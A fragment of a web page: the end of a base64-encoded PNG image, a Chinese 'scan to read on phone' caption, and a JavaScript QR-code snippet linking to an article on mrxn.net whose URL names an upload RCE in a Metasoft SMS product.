fSA6BHtd55CcfUSIDlx/pn57s9f2Sd1piat9dh/u04X9tfkzhNR6X5i59fryIzQjwtwLZm7OXisOc90qry6u+nW98tf3EE/lTXD7HgKZPjyH7r+mOq6uw9xPH2bdHvqiOiSvLkJ0QGlDa8XN+HsBfPxO8C/9uAZ2/z2Ivn1E9Y4w99WHWYdwuOP1DvG03gS3gTj1M1ztGzLl7tvvTIe5flW36lP57q14ZWvpQ+5dWi0I1y+tFkSHGc2Jla0lF0ur1Xlprm0ghi587QnsBgLz9CF8tU2YfSdtHmYfwiFozjpRfYWQetijNbD3AO0NvSfw8X1EA8IhqL5CSA5m7HlY+7uB9OKL/+4J/NhAfMrcPuQp6Lq+qA/Jq6/QvDjmjrTRf/baPh2t7/oZt040Lx/xxwYyNr2uv34C/7eB+BRAnny5Wz3jkLqeh1nXP0LvIZqBuQccc5h1+0B0CNpXhFnvdea6Dlw/y7q92Wv3DnFqHVf7Nrfyu36Wh/npgnAI2g9mXjrstdJd3ltU76gv6sPc/8y37jO4G8hniq/sz5/ANhDI9OExnm0BUm/OpwhmXV+E2beuo/muH3GzZ9hrzUP2BEF1EY51+8GxD9EhaL/CbSBFrvX6E7gG8voZTDv4HwAAAP//TkEJdgAAAAZJREFUAwCKAgqtZYregAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/metasoft-business-sendsms-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 